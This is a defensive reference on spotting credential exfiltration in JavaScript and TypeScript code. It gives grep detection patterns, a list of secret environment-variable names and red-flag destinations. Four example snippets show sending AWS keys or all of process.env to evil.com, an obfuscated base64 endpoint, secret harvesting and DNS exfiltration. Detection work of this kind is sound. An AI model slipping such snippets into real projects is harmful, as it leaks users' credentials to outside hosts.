# Data Exfiltration Detection Patterns

Patterns indicating credentials, tokens, or secrets being sent to external servers.

## Grep Patterns

```bash
# Environment variables in HTTP requests
grep -rnE "(fetch|axios|http\.request|https\.request|got|node-fetch|request)\s*\(" --include="*.ts" --include="*.js" --include="*.mjs"

# Hardcoded external URLs with env vars
grep -rnE "process\.env\." --include="*.ts" --include="*.js" | grep -iE "(fetch|post|send|request|axios|http)"

# Base64-encoded URLs (potential C2 servers)
grep -rnE "Buffer\.from\(['\"]([A-Za-z0-9+/=]{20,})['\"],\s*['\"]base64['\"]\)" --include="*.ts" --include="*.js"

# DNS exfiltration (encoding data in DNS queries)
grep -rnE "(dns\.resolve|dns\.lookup|dgram\.createSocket)" --include="*.ts" --include="*.js"

# Webhook/exfil endpoints
grep -rniE "(webhook|discord\.com/api/webhooks|hooks\.slack\.com|telegram\.org/bot)" --include="*.ts" --include="*.js"
```

## Suspicious Patterns

### 1. Credentials in Request Body/Headers

```javascript
// 🔴 CRITICAL — Sending env vars to external endpoint
fetch("https://evil.com/collect", {
  method: "POST",
  body: JSON.stringify({
    aws_key: process.env.AWS_ACCESS_KEY_ID,
    aws_secret: process.env.AWS_SECRET_ACCESS_KEY,
  }),
});
```

### 2. Encoded Destination URL

```javascript
// 🔴 CRITICAL — Obfuscated exfil endpoint
const url = Buffer.from("aHR0cHM6Ly9ldmlsLmNvbS9jb2xsZWN0", "base64").toString();
fetch(url, { method: "POST", body: JSON.stringify(process.env) });
```

### 3. Token/Key Harvesting

```javascript
// 🔴 CRITICAL — Reading all env vars and sending them out
const data = Object.entries(process.env)
  .filter(([k]) => /KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL/i.test(k))
  .reduce((acc, [k, v]) => ({ ...acc, [k]: v }), {});
```

### 4. DNS Exfiltration

```javascript
// 🔴 CRITICAL — Encoding data as DNS queries
const dns = require("dns");
const encoded = Buffer.from(secret).toString("hex");
dns.resolve(`${encoded}.evil.com`, () => {});
```

## Environment Variable Keywords to Flag

Grep for these keywords near network calls:

```
API_KEY, SECRET_KEY, ACCESS_KEY, AUTH_TOKEN, PRIVATE_KEY,
DATABASE_URL, DB_PASSWORD, JWT_SECRET, GITHUB_TOKEN,
AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, STRIPE_SECRET,
OPENAI_API_KEY, NPM_TOKEN, GH_TOKEN, SLACK_TOKEN
```

## Network Destination Red Flags

Flag HTTP calls to:
- Hardcoded IPs (especially non-RFC1918)
- Domains not matching the project's known API endpoints
- `.ngrok.io`, `.serveo.net`, `.localtunnel.me`
- Webhook URLs (Discord, Slack, Telegram)
- Recently registered domains
